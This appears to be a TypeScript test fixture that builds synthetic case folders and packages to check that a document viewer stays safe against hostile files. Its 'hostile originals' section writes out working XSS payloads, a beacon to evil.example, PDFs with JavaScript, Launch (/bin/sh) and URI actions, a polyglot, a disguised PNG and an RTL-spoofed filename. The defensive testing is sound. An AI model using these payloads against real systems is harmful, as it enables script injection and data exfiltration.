// Synthetic cases for the pilot's browser and durability tests: a case folder of invented originals and a results
// package converted from a v5-shaped workspace by GRS-10's own adapter (convertV5 + writePackageDir), so every
// package passes the real contract. Nothing here comes from a case. Negative controls (missing, tampered, broken)
// are built only in these disposable folders.
import { mkdir, rm, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { convertV5 } from '../../../../src/lib/case-package/v5/adapter.ts';
import { writePackageDir } from '../../../../src/lib/case-package/writer.ts';
import { synthHtml, synthOriginals, synthRoots, writeCaseFolder, type SynthRoots } from '../../../case-package/fixtures/synth.ts';

type J = Record<string, unknown>;
export interface SynthCase { root: string; caseDir: string; pkgDir: string; resultsVersion: string; files: Map<string, Uint8Array>; diagnostics: { code: string }[] }
export interface SynthOptions {
	caseId?: string;
	/** extra or replaced originals (path -> bytes) */
	originals?: Record<string, Uint8Array | null>;
	/** chronology rows to append (see `row`) */
	rows?: J[];
	edit?: (r: SynthRoots) => void;
	/** case folder to reuse instead of writing a new one (several packages against one folder) */
	caseDir?: string;
}

const enc = (s: string) => new TextEncoder().encode(s);
export const url = (p: string) => './' + p.split('/').map(encodeURIComponent).join('/');

/** A chronology row in the synthetic v5 shape for an original at `file`. */
export function row(ref: string, n: number, file: string, size: number, o: J = {}): J {
	return {
		n: String(n), ref, date: '2002-03-04', filename: file.split('/').pop(), subject: `Synthetic ${ref}`, sender: 'Test Sender', to: 'Test Org', cc: '',
		excerpt: 'Invented excerpt.', doc_type: 'other', bundle: 'Original', amount: '', also_in: [], text_status: 'extracted', url: url(file),
		refs: [], invoice_no: '', size, seq: String(n), attachments: [], ...o,
	};
}

export async function buildCase(root: string, opts: SynthOptions = {}): Promise<SynthCase> {
	await mkdir(root, { recursive: true });
	const caseDir = opts.caseDir ?? path.join(root, 'case');
	const pkgDir = path.join(root, 'pkg');
	await rm(pkgDir, { recursive: true, force: true });
	const originals: Record<string, Uint8Array> = { ...synthOriginals() };
	for (const [p, b] of Object.entries(opts.originals ?? {})) { if (b === null) delete originals[p]; else originals[p] = b; }
	if (!opts.caseDir) { await rm(caseDir, { recursive: true, force: true }); await writeCaseFolder(caseDir, originals); }
	const roots = synthRoots();
	if (opts.rows) (roots.DATA.chronology as J[]).push(...opts.rows);
	opts.edit?.(roots);
	const result = await convertV5({ html: synthHtml(roots), htmlName: 'workspace.html', caseFolder: caseDir, caseId: opts.caseId ?? 'e2e-case' });
	if (!result.files || !result.manifest) throw new Error('synthetic conversion failed: ' + result.diagnostics.map((d) => d.code).join(','));
	await writePackageDir(pkgDir, result.files);
	return { root, caseDir, pkgDir, resultsVersion: result.manifest.resultsVersion, files: result.files, diagnostics: result.diagnostics };
}

/** Write bytes into a case folder (a disposable copy only). */
export async function putOriginal(caseDir: string, rel: string, bytes: Uint8Array) {
	const abs = path.join(caseDir, ...rel.split('/'));
	await mkdir(path.dirname(abs), { recursive: true });
	await writeFile(abs, bytes);
}

// ---- hostile originals (synthetic) -------------------------------------------------------------------------------
const CANARY = Number(process.env.CANARY_PORT ?? 41199);
const beacon = (tag: string) => `fetch('http://127.0.0.1:${CANARY}/exec-${tag}').catch(()=>{});new Image().src='http://evil.example/img-${tag}';document.title='PWNED ${tag}';try{localStorage.setItem('pwned','${tag}')}catch(e){}alert('${tag}')`;

/** A minimal one-page PDF; `extra` objects and catalog entries add actions. */
export function pdf(label: string, { catalog = '', objects = '' as string } = {}): Uint8Array {
	const body = [
		'%PDF-1.4',
		`1 0 obj << /Type /Catalog /Pages 2 0 R ${catalog} >> endobj`,
		'2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj',
		'3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> /Annots [] >> endobj',
		`4 0 obj << /Length 60 >> stream\nBT /F1 18 Tf 20 100 Td (${label.replace(/[()\\]/g, '')}) Tj ET\nendstream endobj`,
		'5 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> endobj',
		objects,
		'trailer << /Root 1 0 R >>',
		'%%EOF',
		'',
	].join('\n');
	return enc(body);
}

export const hostileOriginals = (): Record<string, Uint8Array> => ({
	'HOSTILE/HX-001 page.html': enc(`<!doctype html><html><body><h1>hostile html</h1><script>${beacon('html')}</script><img src=x onerror="${beacon('html-img')}"></body></html>`),
	'HOSTILE/HX-002 drawing.svg': enc(`<svg xmlns="http://www.w3.org/2000/svg" onload="${beacon('svg')}"><script>${beacon('svg-script')}</script></svg>`),
	'HOSTILE/HX-003 notes.txt': enc(`<script>${beacon('txt')}</script> plain text`),
	// a polyglot: an HTML page with %PDF- in its first KiB, indexed as a PDF
	'HOSTILE/HX-004 polyglot.pdf': enc(`<!-- %PDF-1.4 --><html><body><script>${beacon('polyglot')}</script>polyglot</body></html>`),
	'HOSTILE/HX-005 open-action.pdf': pdf('open action', { catalog: '/OpenAction 6 0 R /Names << /JavaScript << /Names [(x) 7 0 R] >> >>', objects: `6 0 obj << /Type /Action /S /JavaScript /JS (app.alert('openaction'); this.submitForm('http://evil.example/pdf-js');) >> endobj\n7 0 obj << /Type /Action /S /JavaScript /JS (app.alert('names')) >> endobj` }),
	'HOSTILE/HX-006 launch.pdf': pdf('launch', { catalog: '/OpenAction 6 0 R', objects: '6 0 obj << /Type /Action /S /Launch /F (/bin/sh) >> endobj' }),
	'HOSTILE/HX-007 uri.pdf': pdf('uri', { catalog: '/OpenAction 6 0 R', objects: '6 0 obj << /Type /Action /S /URI /URI (http://evil.example/pdf-uri) >> endobj' }),
	'HOSTILE/HX-008 mail.eml': enc(`From: x@example.invalid\nSubject: hostile\nContent-Type: text/html\n\n<script>${beacon('eml')}</script>`),
	'HOSTILE/HX-009 image.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 0x1f, 0x15, 0xc4, 0x89, 0, 0, 0, 10, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x63, 0, 1, 0, 0, 5, 0, 1, 0x0d, 0x0a, 0x2d, 0xb4, 0, 0, 0, 0, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]),
	// HTML content declared as an image: ORIG_MEDIA_MISMATCH, download only
	'HOSTILE/HX-010 fake.png': enc(`<html><script>${beacon('fake-png')}</script></html>`),
});

/** Chronology rows for the hostile originals, with hostile narrative fields (inert text in every view). */
export function hostileRows(start = 100): J[] {
	const files = hostileOriginals();
	const hostileText = `<script>${beacon('narrative')}</script><img src=x onerror="${beacon('narr-img')}"> [x](javascript:alert(1)) <a href="http://evil.example/">link</a>`;
	return Object.entries(files).map(([p, b], i) => row(`HX-${String(i + 1).padStart(3, '0')}`, start + i, p, b.byteLength, {
		subject: i === 0 ? hostileText : `Hostile ${i + 1} ‮fdp.exe`, sender: '<b onmouseover=alert(1)>sender</b>', excerpt: hostileText,
		doc_type: 'hostile', bundle: 'Hostile',
	}));
}
